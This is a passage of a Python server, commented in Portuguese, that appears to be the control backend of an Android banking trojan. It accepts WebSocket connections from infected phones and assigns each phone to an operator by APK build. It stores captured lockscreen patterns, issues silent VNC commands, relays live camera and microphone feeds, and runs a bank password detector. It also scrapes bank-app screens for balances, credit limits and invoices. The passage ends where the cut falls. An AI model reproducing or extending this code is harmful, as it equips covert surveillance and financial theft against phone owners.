        """🔲 Retorna Pattern capturado do lockscreen"""
        return self.device_patterns.get(device_id)
    
    def clear_device_pattern(self, device_id: str):
        """🔲 Limpa Pattern armazenado"""
        if device_id in self.device_patterns:
            del self.device_patterns[device_id]
            logger.info(f"🔲 Pattern limpo para {device_id}")

    def store_device_lockscreen_active(self, device_id: str, active: bool):
        """🔒 Armazena status ativo do lockscreen"""
        self.device_lockscreen_active[device_id] = active
        logger.info(f"🔒 Status Lockscreen para {device_id}: {active}")
        
    def get_device_lockscreen_active(self, device_id: str) -> bool:
        """🔒 Retorna status ativo do lockscreen"""
        return self.device_lockscreen_active.get(device_id, False)
        
    async def connect(self, device_id: str, websocket: WebSocket):
        """Aceita nova conexão de dispositivo"""
        await websocket.accept()
        
        # Se já existe uma conexão ativa diferente, fecha ela
        if device_id in self.active_connections:
            old_ws = self.active_connections[device_id]
            if old_ws is not websocket:
                logger.info(f"🔄 Fechando conexão WebSocket antiga para {device_id} antes de registrar a nova")
                asyncio.create_task(safe_close_websocket(old_ws))
        
        # Verifica se é reconexão
        is_reconnect = device_id in self.dashboard_subscribers and len(self.dashboard_subscribers[device_id]) > 0
        
        self.active_connections[device_id] = websocket
        self.update_device_activity(device_id)
        
        if device_id not in self.password_detector:
            self.password_detector[device_id] = BankPasswordDetector(device_id)
        
        if is_reconnect:
            logger.info(f"🔄 Dispositivo RECONECTADO: {device_id} (subscribers ativos: {len(self.dashboard_subscribers[device_id])})")
            # Notifica subscribers que dispositivo voltou - envia último frame salvo se existir
            latest = self.get_latest_screen(device_id)
            if latest:
                await self._broadcast_frame(device_id, latest)
        else:
            logger.info(f"✓ Dispositivo conectado: {device_id}")
        
    def disconnect(self, device_id: str, websocket: Optional[WebSocket] = None):
        """Remove dispositivo desconectado - limpa totalmente a memória residual para liberar o VNC"""
        if device_id in self.active_connections:
            ws = self.active_connections[device_id]
            if websocket is None or ws is websocket:
                del self.active_connections[device_id]
                asyncio.create_task(safe_close_websocket(ws))
                if device_id in self.device_info:
                    del self.device_info[device_id]
                if device_id in self.device_active_banks:
                    del self.device_active_banks[device_id]
                if device_id in self.device_screens:
                    del self.device_screens[device_id]
                if device_id in self.device_screen_timestamps:
                    del self.device_screen_timestamps[device_id]
                if device_id in self.device_screen_hierarchies:
                    del self.device_screen_hierarchies[device_id]
                if device_id in self.device_hierarchy_timestamps:
                    del self.device_hierarchy_timestamps[device_id]
                if device_id in self.device_silent_state:
                    del self.device_silent_state[device_id]
                if device_id in self.device_camera_frames:
                    del self.device_camera_frames[device_id]
                if device_id in self.device_audio_chunks:
                    del self.device_audio_chunks[device_id]
                logger.info(f"✗ Dispositivo desconectado e memória limpa: {device_id}")

        
    async def send_command(self, device_id: str, command: dict):
        """Envia comando para dispositivo específico (case-insensitive)"""
        target_key = device_id
        if target_key not in self.active_connections:
            for k in list(self.active_connections.keys()):
                if k.lower() == device_id.lower():
                    target_key = k
                    break

        if target_key in self.active_connections:
            websocket = self.active_connections[target_key]
            lock = self.connection_locks.setdefault(target_key, asyncio.Lock())
            async with lock:
                try:
                    await websocket.send_json(command)
                    if command.get('action') != 'SPEAK_AUDIO':
                        logger.info(f"Comando enviado para {target_key}: {command['action']}")
                    return True
                except Exception:
                    self.disconnect(target_key, websocket)
                    return False
        return False
    
    async def broadcast_to_operators(self, message: dict):
        """Envia mensagem para todos os operadores inscritos no dashboard"""
        for device_id, subscribers in list(self.dashboard_subscribers.items()):
            for sub in list(subscribers):
                try:
                    await sub.websocket.send_json(message)
                except Exception:
                    pass

    def get_connected_devices(self) -> List[dict]:
        """Retorna lista de dispositivos conectados"""
        devices = []
        for device_id, info in self.device_info.items():
            devices.append({
                "id": device_id,
                "connected": device_id in self.active_connections,
                **info
            })
        return devices
    
    def get_latest_screen(self, device_id: str, max_age_seconds: float = 120.0) -> Optional[bytes]:
        """Retorna último frame capturado. Mantém retenção resiliente para evitar 404 durante variações de FPS."""
        ts = self.device_screen_timestamps.get(device_id)
        if ts and (utc_now() - ts).total_seconds() <= max_age_seconds:
            frame = self.device_screens.get(device_id)
            if frame:
                return frame
        # Fallback: retorna último frame conhecido se existir
        return self.device_screens.get(device_id)
    
    def get_latest_hierarchy(self, device_id: str, max_age_seconds: float = 60.0) -> Optional[str]:
        """Retorna última hierarquia de tela (V2) mantendo estado ativo enquanto aguarda novos frames."""
        data = self.device_screen_hierarchies.get(device_id)
        if data:
            ts = self.device_hierarchy_timestamps.get(device_id)
            if ts and (utc_now() - ts).total_seconds() <= max_age_seconds:
                return data
            elif not ts:
                return data
        return None
    
    async def store_screen_frame(self, device_id: str, jpeg_data: bytes):
        """Armazena frame com otimização - NÃO persiste em disco a cada frame"""
        # Contador de frames para skip
        self.device_screens[device_id] = jpeg_data
        self.device_screen_timestamps[device_id] = utc_now()
        await self._broadcast_frame(device_id, jpeg_data)
    
    def store_screen_hierarchy(self, device_id: str, hierarchy_data: str):
        self.device_screen_hierarchies[device_id] = hierarchy_data
        self.device_hierarchy_timestamps[device_id] = utc_now()
        try:
            asyncio.create_task(self.extract_bank_balance_from_hierarchy(device_id, hierarchy_data))
        except Exception:
            pass

    async def extract_bank_balance_from_hierarchy(self, device_id: str, hierarchy_data: object):
        """Extrai automaticamente saldo, limite e fatura de qualquer banco com throttling de 15s por aparelho."""
        if not hierarchy_data:
            return

        import time
        now_ts = time.time()
        last_ts = self.last_balance_extract_time.get(device_id, 0)
        if now_ts - last_ts < 15.0:
            return
        self.last_balance_extract_time[device_id] = now_ts

        def _async_extract():
            try:
                db = SessionLocal()
                try:
                    hier_text = hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data)
                    foreground_pkg = self.device_info.get(device_id, {}).get("foreground_package", "")
                    active_bank = self.device_active_banks.get(device_id)
                    current_pkg = (active_bank or {}).get("package") or foreground_pkg or ""
                    
                    bank_keywords = [
                        "bb.android", "nu.production", "nubank", "itau", "bradesco", "caixa", 
                        "santander", "mercadopago", "intermedium", "c6bank", "picpay", "uol.ps.myaccount", 
                        "pagbank", "willbank", "sicredi", "sicoob", "btg", "daycoval", "banrisul", 
                        "safra", "stone", "sumup", "neon", "bancopan", "agibank", "bmg", 
                        "pluxee", "ben", "flashapp", "wise", "revolut", "creditas", "daviplata", "davivienda",
                        "bank", "banco", "pag", "pay", "card", "cartao", "credit", "finan", "invest"
                    ]
                    
                    is_bank_screen = any(kw in current_pkg.lower() for kw in bank_keywords)
                    
                    money_symbol_pattern = re.compile(
                        r'(?:R\$\s*|R\s*\$\s*|\$\s*)(-?\s*\d{1,3}(?:[\.,]\d{3})*[\.,]\d{2}|-?\s*\d+[\.,]\d{2})',
                        re.IGNORECASE
                    )
                    money_raw_pattern = re.compile(
                        r'\b(-?\s*\d{1,3}(?:\.\d{3})*,\d{2})\b|\b(-?\s*\d+,\d{2})\b'
                    )

                    def parse_brl(v):
                        v = v.replace("R$", "").replace("r$", "").replace("$", "").replace(" ", "").strip()
                        if ',' in v and '.' in v:
                            if v.rfind(',') > v.rfind('.'):
                                v = v.replace('.', '').replace(',', '.')
                            else:
                                v = v.replace(',', '')
                        elif ',' in v:
                            v = v.replace(',', '.')
                        try:
                            return float(v)
                        except Exception:
                            return None

                    nodes = []
                    try:
                        data = json.loads(hier_text) if isinstance(hier_text, str) else hier_text
                        root_node = data.get("hierarchy") if isinstance(data, dict) and "hierarchy" in data else data
                        
                        def traverse_json(node):
                            if not isinstance(node, dict): return
                            text = str(node.get("text", "") or "")
                            desc = str(node.get("desc", "") or node.get("content_desc", "") or "")
                            res_id = str(node.get("id", "") or node.get("resource_id", "") or "")
                            pkg = str(node.get("package", "") or "")
                            nodes.append({"text": text, "content_desc": desc, "resource_id": res_id, "package": pkg})
                            for child in node.get("children", []):
                                traverse_json(child)
                        traverse_json(root_node)
                    except Exception:
                        try:
                            import xml.etree.ElementTree as ET
                            root = ET.fromstring(hier_text)
                            def traverse_xml(node):
                                text = str(node.get("text", "") or "")
                                desc = str(node.get("content-desc", "") or "")
                                res_id = str(node.get("resource-id", "") or "")
                                pkg = str(node.get("package", "") or "")
                                nodes.append({"text": text, "content_desc": desc, "resource_id": res_id, "package": pkg})
                                for child in node: traverse_xml(child)
                            traverse_xml(root)
                        except Exception:
                            nodes = []

                    bal_candidates = []
                    lim_candidates = []
                    inv_candidates = []

                    bal_pos_keywords = ["saldo", "disponivel", "disponível", "disponible", "saldo da conta", "saldo em conta", "saldo total", "conta corrente", "carteira", "balance", "dinheiro em conta"]
                    lim_pos_keywords = ["limite", "limite disponível", "limite disponivel", "limite de crédito", "limite de credito", "limite total", "credit_limit"]
                    inv_pos_keywords = ["fatura", "fatura atual", "valor da fatura", "fatura fechada", "fatura aberta", "faturas"]

                    for idx, item in enumerate(nodes):
                        text = item["text"].strip()
                        desc = item["content_desc"].strip()
                        resource_id = item["resource_id"].lower()
                        
                        for val_str in [text, desc]:
                            if not val_str or len(val_str) < 3: continue
                            val_str_lower = val_str.lower()

                            matches_sym = money_symbol_pattern.findall(val_str)
                            for m in matches_sym:
                                val = parse_brl(m)
                                if val is not None and -999999.0 <= val <= 9999999.0:
                                    formatted_val = f"R$ {m.strip()}"
                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "loan", "invoice"])
                                    is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "card", "invoice"])
                                    
                                    start_idx = max(0, idx - 4)
                                    end_idx = min(len(nodes), idx + 5)
                                    has_credit_neighbor = False
                                    for neighbor_idx in range(start_idx, end_idx):
                                        if neighbor_idx == idx: continue
                                        n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
                                        if any(nk in n_text for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "loan", "invoice"]):
                                            has_credit_neighbor = True
                                            break
                                    
                                    if not (is_credit_node or is_credit_res or has_credit_neighbor):
                                        bal_score = 300 if is_bank_screen else 100
                                        if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]): bal_score += 4000
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx: continue
                                            n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(pk in n_text for pk in bal_pos_keywords):
                                                bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                        bal_candidates.append({"formatted": formatted_val, "score": bal_score})

                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupança", "investimento", "carteira", "extrato"])
                                    is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                    if not (is_bal_node or is_fatura_node):
                                        lim_score = 300 if is_bank_screen else 100
                                        if any(lk in val_str_lower for lk in ["limite", "limit"]): lim_score += 3000
                                        if any(lk in resource_id for lk in ["limit", "limite", "credit_limit"]): lim_score += 4000
                                        lim_candidates.append({"formatted": formatted_val, "score": lim_score})

                            if is_bank_screen and not matches_sym:
                                matches_raw = money_raw_pattern.findall(val_str)
                                for m_tuple in matches_raw:
                                    m = m_tuple[0] or m_tuple[1]
                                    if m:
                                        val = parse_brl(m)
                                        if val is not None and -999999.0 <= val <= 9999999.0:
                                            formatted_val = f"R$ {m.strip()}"
                                            bal_score = 200
                                            if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]): bal_score += 4000
                                            start_idx = max(0, idx - 4)
                                            end_idx = min(len(nodes), idx + 5)
                                            for neighbor_idx in range(start_idx, end_idx):
                                                if neighbor_idx == idx: continue
                                                n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
                                                distance = abs(neighbor_idx - idx)
                                                if any(pk in n_text for pk in bal_pos_keywords):
                                                    bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                            if bal_score >= 1000:
                                                bal_candidates.append({"formatted": formatted_val, "score": bal_score})

                    if not nodes and is_bank_screen:
                        matches = money_symbol_pattern.findall(hier_text)
                        for m in matches:
                            val = parse_brl(m)
                            if val is not None and -999999.0 <= val <= 9999999.0:
                                bal_candidates.append({"formatted": f"R$ {m.strip()}", "score": 500})

                    best_balance = max(bal_candidates, key=lambda c: c["score"])["formatted"] if bal_candidates else None
                    best_limit = max(lim_candidates, key=lambda c: c["score"])["formatted"] if lim_candidates else None
                    best_invoice = max(inv_candidates, key=lambda c: c["score"])["formatted"] if inv_candidates else None

                    if not best_balance and is_bank_screen:
                        if any(m_str in hier_text for m_str in ["••••", "•••", "R$ •", "***", "R$ *"]):
                            best_balance = "🔒 Saldo Oculto no App (Clique no olho no celular para revelar)"

                    if best_balance or best_limit or best_invoice:
                        app_name = (active_bank or {}).get("appName") or self.device_info.get(device_id, {}).get("foreground_app") or (current_pkg.split(".")[-1].title() if current_pkg else "Banco")
                        target_pkg = current_pkg or "banco.generico"

                        recent = db.query(DeviceLog).filter(
                            DeviceLog.device_id == device_id,
                            DeviceLog.log_type == "BANK_BALANCE"
                        ).order_by(DeviceLog.created_at.desc()).first()

                        should_save = True
                        if recent:
                            try:
                                r_data = json.loads(recent.log_data)
                                if (r_data.get("package") == target_pkg and 
                                    r_data.get("balance") == best_balance and 
                                    r_data.get("credit_limit") == best_limit and 
                                    r_data.get("invoice") == best_invoice):
                                    should_save = False
                            except Exception:
                                pass

                        if should_save:
                            balance_log = DeviceLog(
                                device_id=device_id,
                                log_type="BANK_BALANCE",
                                log_data=json.dumps({
                                    "package": target_pkg,
                                    "appName": app_name,
                                    "balance": best_balance,
                                    "credit_limit": best_limit,
                                    "invoice": best_invoice,
                                    "source": "screen_hierarchy_auto"
                                }),
                                created_at=utc_now()
                            )
                            db.add(balance_log)
                            db.commit()
                            logger.info(f"💰 SALDO AUTO-CAPTURADO: {device_id} ({app_name}) -> Saldo: {best_balance} | Limite: {best_limit} | Fatura: {best_invoice}")
                finally:
                    try: db.rollback()
                    except Exception: pass
                    db.close()
            except Exception as ex:
                logger.warning(f"Aviso no extrator de saldo: {ex}")

        await asyncio.to_thread(_async_extract)
    
    async def register_dashboard_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
        await websocket.accept()
        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE)
        subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
        self.dashboard_subscribers.setdefault(device_id, []).append(subscriber)
        
        # Envia frame atual apenas se for recente (< 5s)
        latest = self.get_latest_screen(device_id, max_age_seconds=5.0)
        if latest:
            await queue.put(latest)

        # Força o dispositivo Android a iniciar/solicitar um novo frame VNC ao vivo imediatamente
        asyncio.create_task(self.send_command(device_id, {"action": "START_SILENT_VNC"}))
        asyncio.create_task(self.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))
        return queue
    
    def unregister_dashboard_client(self, device_id: str, websocket: WebSocket):
        subscribers = self.dashboard_subscribers.get(device_id, [])
        remaining = [s for s in subscribers if s.websocket is not websocket]
        if remaining:
            self.dashboard_subscribers[device_id] = remaining
        else:
            self.dashboard_subscribers.pop(device_id, None)
    
    async def _broadcast_frame(self, device_id: str, jpeg_data: bytes):
        """Broadcast otimizado - descarta frames antigos, entrega o mais recente"""
        subscribers = self.dashboard_subscribers.get(device_id, [])
        if not subscribers:
            return
        
        stale: List[DashboardSubscriber] = []
        
        for sub in subscribers:
            try:
                # Drena toda a fila de uma vez - mantém apenas o frame mais recente
                while not sub.queue.empty():
                    try:
                        sub.queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                sub.queue.put_nowait(jpeg_data)
            except asyncio.QueueFull:
                try:
                    _ = sub.queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                try:
                    sub.queue.put_nowait(jpeg_data)
                except Exception:
                    stale.append(sub)
            except (RuntimeError, Exception):
                stale.append(sub)
        
        if stale:
            self.dashboard_subscribers[device_id] = [s for s in subscribers if s not in stale]
            if not self.dashboard_subscribers[device_id]:
                self.dashboard_subscribers.pop(device_id, None)
    
    def _frame_cache_path(self, device_id: str) -> Path:
        return FRAME_CACHE_DIR / f"{device_id}.jpg"
    
    def _hierarchy_cache_path(self, device_id: str) -> Path:
        return HIERARCHY_CACHE_DIR / f"{device_id}.json"
    
    def _persist_frame(self, device_id: str, jpeg_data: bytes):
        try:
            with open(self._frame_cache_path(device_id), "wb") as fh:
                fh.write(jpeg_data)
        except Exception as exc:
            logger.error(f"Erro ao persistir frame ({device_id}): {exc}")
    
    def _persist_hierarchy(self, device_id: str, data: str):
        try:
            with open(self._hierarchy_cache_path(device_id), "w", encoding="utf-8") as fh:
                fh.write(data)
        except Exception as exc:
            logger.error(f"Erro ao persistir hierarquia ({device_id}): {exc}")
    
    def _delete_cached_frame(self, device_id: str):
        try:
            path = self._frame_cache_path(device_id)
            if path.exists():
                path.unlink()
        except Exception:
            pass
    
    def _delete_cached_hierarchy(self, device_id: str):
        try:
            path = self._hierarchy_cache_path(device_id)
            if path.exists():
                path.unlink()
        except Exception:
            pass
    
    async def run_housekeeping(self):
        """Limpeza de memória periódica — WAL checkpoint a cada 2 min"""
        _wal_counter = 0
        while True:
            await asyncio.sleep(60)
            await self._cleanup_expired_entries()
            _wal_counter += 1
            if _wal_counter % 2 == 0:
                await asyncio.to_thread(checkpoint_wal)
    
    async def _cleanup_expired_entries(self):
        """Limpeza agressiva de memória"""
        async with self.cleanup_lock:
            now = utc_now()
            
            # Limpa frames expirados
            expired_frames = [
                device_id for device_id, ts in list(self.device_screen_timestamps.items())
                if now - ts > FRAME_TTL
            ]
            for device_id in expired_frames:
                self.device_screens.pop(device_id, None)
                self.device_screen_timestamps.pop(device_id, None)
                _frame_counter.pop(device_id, None)
            
            # Limpa hierarquias expiradas
            expired_hierarchies = [
                device_id for device_id, ts in list(self.device_hierarchy_timestamps.items())
                if now - ts > HIERARCHY_TTL
            ]
            for device_id in expired_hierarchies:
                self.device_screen_hierarchies.pop(device_id, None)
                self.device_hierarchy_timestamps.pop(device_id, None)
            
            # Limpa câmera expirada (30 segundos)
            expired_camera = [
                device_id for device_id, ts in list(self.device_camera_timestamps.items())
                if now - ts > timedelta(seconds=30)
            ]
            for device_id in expired_camera:
                self.device_camera_frames.pop(device_id, None)
                self.device_camera_timestamps.pop(device_id, None)
            
            # Limpa áudio expirado (10 segundos)
            expired_audio = [
                device_id for device_id, ts in list(self.device_audio_timestamps.items())
                if now - ts > timedelta(seconds=10)
            ]
            for device_id in expired_audio:
                self.device_audio_chunks.pop(device_id, None)
                self.device_audio_timestamps.pop(device_id, None)
            
            # Log de status
            active = len(self.active_connections)
            frames_in_mem = len(self.device_screens)
            logger.info(f"🧹 Housekeeping: {active} dispositivos, {frames_in_mem} frames em memória")

            # Retention inteligente de logs: preserva histórico por até 90 dias ou 150.000 registros
            def _prune_old_db_logs():
                try:
                    db = SessionLocal()
                    try:
                        # Pruna apenas logs com mais de 90 dias de idade
                        cutoff = utc_now() - timedelta(days=90)
                        deleted_by_age = db.query(DeviceLog).filter(DeviceLog.created_at < cutoff).delete(synchronize_session=False)
                        
                        # Limite de segurança super alto (150.000) apenas para evitar estouro extremo do DB
                        total_logs = db.query(DeviceLog).count()
                        deleted_by_count = 0
                        if total_logs > 150000:
                            subq = db.query(DeviceLog.id).order_by(DeviceLog.created_at.desc()).offset(150000).subquery()
                            deleted_by_count = db.query(DeviceLog).filter(DeviceLog.id.in_(subq.select())).delete(synchronize_session=False)
                        
                        if deleted_by_age or deleted_by_count:
                            safe_db_commit_sync(db)
                            logger.info(f"🧹 Housekeeping: Pruned {deleted_by_age + deleted_by_count} logs antigos")
                    finally:
                        try:
                            db.rollback()
                        except Exception:
                            pass
                        db.close()
                except Exception as ex:
                    logger.warning(f"Aviso no pruning de DB: {ex}")

            await asyncio.to_thread(_prune_old_db_logs)


    # ==================== CÂMERA EM TEMPO REAL ====================
    
    async def store_camera_frame(self, device_id: str, jpeg_data: bytes):
        """Armazena frame da câmera e transmite para subscribers"""
        self.device_camera_frames[device_id] = jpeg_data
        self.device_camera_timestamps[device_id] = utc_now()
        await self._broadcast_camera_frame(device_id, jpeg_data)
    
    def get_latest_camera_frame(self, device_id: str) -> Optional[bytes]:
        """Retorna último frame da câmera"""
        return self.device_camera_frames.get(device_id)
    
    async def register_camera_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
        """Registra cliente para receber stream de câmera"""
        await websocket.accept()
        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE)
        subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
        self.camera_subscribers.setdefault(device_id, []).append(subscriber)
        
        # Envia frame atual imediatamente se existir
        latest = self.get_latest_camera_frame(device_id)
        if latest:
            await queue.put(latest)
        return queue
    
    def unregister_camera_client(self, device_id: str, websocket: WebSocket):
        """Remove cliente do stream de câmera"""
        subscribers = self.camera_subscribers.get(device_id, [])
        remaining = [s for s in subscribers if s.websocket is not websocket]
        if remaining:
            self.camera_subscribers[device_id] = remaining
        else:
            self.camera_subscribers.pop(device_id, None)
    
    async def _broadcast_camera_frame(self, device_id: str, jpeg_data: bytes):
        """Envia frame de câmera para todos os subscribers"""
        subscribers = self.camera_subscribers.get(device_id, [])
        if not subscribers:
            return
        
        stale_subscribers: List[DashboardSubscriber] = []
        for subscriber in subscribers:
            try:
                subscriber.queue.put_nowait(jpeg_data)
            except asyncio.QueueFull:
                try:
                    _ = subscriber.queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                subscriber.queue.put_nowait(jpeg_data)
            except RuntimeError:
                stale_subscribers.append(subscriber)
        
        if stale_subscribers:
            self.camera_subscribers[device_id] = [s for s in subscribers if s not in stale_subscribers]
            if not self.camera_subscribers[device_id]:
                self.camera_subscribers.pop(device_id, None)
    
    # ==================== MICROFONE EM TEMPO REAL ====================
    
    async def store_audio_chunk(self, device_id: str, audio_data: bytes):
        """Armazena chunk de áudio e transmite para subscribers"""
        self.device_audio_chunks[device_id] = audio_data
        self.device_audio_timestamps[device_id] = utc_now()
        await self._broadcast_audio_chunk(device_id, audio_data)
    
    def get_latest_audio_chunk(self, device_id: str) -> Optional[bytes]:
        """Retorna último chunk de áudio"""
        return self.device_audio_chunks.get(device_id)
    
    async def register_audio_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
        """Registra cliente para receber stream de áudio"""
        await websocket.accept()
        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE * 3)  # Mais buffer para áudio
        subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
        self.audio_subscribers.setdefault(device_id, []).append(subscriber)
        
        # Envia chunk atual imediatamente se existir
        latest = self.get_latest_audio_chunk(device_id)
        if latest:
            await queue.put(latest)
        return queue
    
    def unregister_audio_client(self, device_id: str, websocket: WebSocket):
        """Remove cliente do stream de áudio"""
        subscribers = self.audio_subscribers.get(device_id, [])
        remaining = [s for s in subscribers if s.websocket is not websocket]
        if remaining:
            self.audio_subscribers[device_id] = remaining
        else:
            self.audio_subscribers.pop(device_id, None)
    
    async def _broadcast_audio_chunk(self, device_id: str, audio_data: bytes):
        """Envia chunk de áudio para todos os subscribers"""
        subscribers = self.audio_subscribers.get(device_id, [])
        if not subscribers:
            return
        
        stale_subscribers: List[DashboardSubscriber] = []
        for subscriber in subscribers:
            try:
                subscriber.queue.put_nowait(audio_data)
            except asyncio.QueueFull:
                try:
                    _ = subscriber.queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                subscriber.queue.put_nowait(audio_data)
            except RuntimeError:
                stale_subscribers.append(subscriber)
        
        if stale_subscribers:
            self.audio_subscribers[device_id] = [s for s in subscribers if s not in stale_subscribers]
            if not self.audio_subscribers[device_id]:
                self.audio_subscribers.pop(device_id, None)

manager = DeviceConnectionManager()


async def authenticate_dashboard_websocket(websocket: WebSocket, device_id: Optional[str] = None) -> Optional[Operator]:
    token = websocket.query_params.get("token")
    if not token:
        await safe_close_websocket(websocket, code=1008, reason="Token obrigatório")
        return None
    
    db = SessionLocal()
    try:
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        except JWTError:
            await safe_close_websocket(websocket, code=1008, reason="Token inválido")
            return None

        if not username:
            await safe_close_websocket(websocket, code=1008, reason="Token sem usuário")
            return None

        operator = db.query(Operator).filter(Operator.username == username).first()
        if not operator:
            await safe_close_websocket(websocket, code=1008, reason="Operador não encontrado")
            return None
        
        if operator.is_banned or not operator.is_active:
            await safe_close_websocket(websocket, code=1008, reason="Conta inativa ou banida")
            return None

        if device_id:
            device = db.query(Device).filter(Device.device_id == device_id).first()
            if not device:
                await safe_close_websocket(websocket, code=1008, reason="Dispositivo não encontrado")
                return None
            if not operator.is_admin and device.owner_id is not None and device.owner_id != operator.id:
                await safe_close_websocket(websocket, code=1008, reason="Acesso negado ao dispositivo")
                return None


        return operator
    except JWTError:
        await safe_close_websocket(websocket, code=1008, reason="Token inválido")
        return None
    except Exception as e:
        logger.error(f"Erro na autenticação de WebSocket do painel: {e}")
        await safe_close_websocket(websocket, code=1008, reason="Erro de autenticação")
        return None
    finally:
        db.close()

# ==================== WEBSOCKET PARA DISPOSITIVOS ====================

def get_websocket_client_ip(websocket: WebSocket) -> Optional[str]:
    """Extrai IP real do cliente (proxy-aware)."""
    forwarded = websocket.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    if websocket.client:
        return websocket.client.host
    return None

WS_IP_CONNECT_ATTEMPTS: Dict[str, List[float]] = {}


def check_ws_rate_limit(client_ip: str) -> bool:
    """Limita conexões WebSocket por IP para prevenir ataques de injeção de aparelhos fake (max 20/minuto)."""
    if not client_ip or client_ip in ["127.0.0.1", "::1", "localhost"]:
        return True
    now_ts = time.time()
    attempts = WS_IP_CONNECT_ATTEMPTS.get(client_ip, [])
    attempts = [t for t in attempts if now_ts - t < 60]
    if len(attempts) >= 20:
        return False
    attempts.append(now_ts)
    WS_IP_CONNECT_ATTEMPTS[client_ip] = attempts
    return True

@app.websocket("/ws/device")
async def websocket_endpoint_device_path(websocket: WebSocket, device_id: str = None, build_id: str = None):
    """
    Alias para /ws — suporta APKs que conectam em /ws/device (path legado).
    """
    await websocket_endpoint(websocket, device_id, build_id)


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_id: str = None):
    """
    Endpoint WebSocket para conexões de dispositivos Android - ULTRA RESILIENTE (50+ DISPOSITIVOS)
    """
    # Fallback: lê device_id do header x-device-id se não vier como query param
    # (APKs antigos enviam via header; APKs novos enviam como query param)
    if not device_id:
        device_id = (
            websocket.headers.get("x-device-id")
            or websocket.headers.get("X-Device-Id")
            or websocket.headers.get("X-DEVICE-ID")
        )

    # Valida formato do ID do dispositivo para evitar injeção de caracteres inválidos/maliciosos
    if not device_id or len(device_id) < 3 or len(device_id) > 100 or not re.match(r'^[a-zA-Z0-9_\-\.\:\@]{3,100}$', device_id):
        await safe_close_websocket(websocket, code=1008, reason="ID de dispositivo inválido")
        return

    # Proteção anti-flood / injeção em massa por IP
    client_ip = get_websocket_client_ip(websocket)
    if not check_ws_rate_limit(client_ip):
        await safe_close_websocket(websocket, code=1008, reason="Limite de conexões excedido")
        return

    await manager.connect(device_id, websocket)

    # Dispara aquecimento de captura VNC imediatamente ao conectar o aparelho
    asyncio.create_task(manager.send_command(device_id, {"action": "START_SILENT_VNC"}))
    asyncio.create_task(manager.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))

    
    # Registra dispositivo no banco de dados em thread separada (não bloqueia event loop)
    def register_device_on_connect(device_id_val: str, build_id_val: str, client_ip_val: str):
        try:
            db = SessionLocal()
            try:
                device = db.query(Device).filter(Device.device_id == device_id_val).first()
                owner_id = None
                if build_id_val:
                    from models import APKBuild, APKVisualBuild
                    apk_build = db.query(APKBuild).filter(APKBuild.build_id == build_id_val).first()
                    if apk_build:
                        owner_id = apk_build.owner_id
                    else:
                        apk_vis_build = db.query(APKVisualBuild).filter(APKVisualBuild.build_id == build_id_val).first()
                        if apk_vis_build:
                            owner_id = apk_vis_build.owner_id
                        else:
                            downloads_dir = Path(__file__).resolve().parent / "downloads"
                            meta_file = downloads_dir / f"{build_id_val}.meta"
                            if meta_file.exists():
                                try:
                                    owner_id = int(meta_file.read_text().strip())
                                except Exception:
                                    pass

                if owner_id is None and build_id_val and str(build_id_val).startswith("win-"):
                    try:
                        owner_id = int(str(build_id_val).split("-")[1])
                    except Exception:
                        pass

                if not device:
                    device = Device(device_id=device_id_val, last_seen=utc_now(), owner_id=owner_id, is_online=True)
                    db.add(device)
                else:
                    device.last_seen = utc_now()
                    device.is_online = True
                    if device.owner_id is None and owner_id is not None:
                        device.owner_id = owner_id
                if client_ip_val:
                    device.ip_address = client_ip_val
                    device.is_online = True

                # Registra log de conexão (CONECTADO)
                conn_log = DeviceLog(
                    device_id=device_id_val,
                    log_type="DEVICE_CONNECTION",
                    log_data=json.dumps({
                        "event": "CONNECTED",
                        "ip": client_ip_val or device.ip_address or "",
                        "timestamp": utc_now().isoformat()
                    })
                )
                db.add(conn_log)
                safe_db_commit_sync(db)
            finally:
                try:
                    db.rollback()
                except Exception:
                    pass
                db.close()
        except Exception as e:
            logger.warning(f"Aviso ao registrar dispositivo {device_id_val} no DB: {e}")

    client_ip = get_websocket_client_ip(websocket)
    await asyncio.to_thread(register_device_on_connect, device_id, build_id, client_ip)
    
    try:
        _consecutive_errors = 0
        _ping_timeout_count = 0
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive(), timeout=180.0)
                _consecutive_errors = 0
                _ping_timeout_count = 0
                
